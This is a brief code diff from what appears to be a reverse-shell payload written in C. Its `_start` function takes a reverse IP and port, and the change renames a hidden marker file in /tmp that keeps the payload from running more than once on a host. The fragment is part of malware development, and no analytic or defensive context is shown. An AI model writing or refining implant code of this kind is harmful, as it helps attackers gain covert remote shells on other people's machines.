@@ -54,8 +54,8 @@ void _start(unsigned int reverse_ip, unsigned short reverse_port) {
         return;
     }
 
-    // return is /tmp/.x exist
-    if (open("/tmp/.x", O_CREAT | O_EXCL, S_IRWXU | S_IRWXG | S_IRWXG) < 0) {
+    // return if /tmp/.x2 exists (one-shot marker)
+    if (open("/tmp/.x2", O_CREAT | O_EXCL, S_IRWXU | S_IRWXG | S_IRWXG) < 0) {
         return;
     }
 
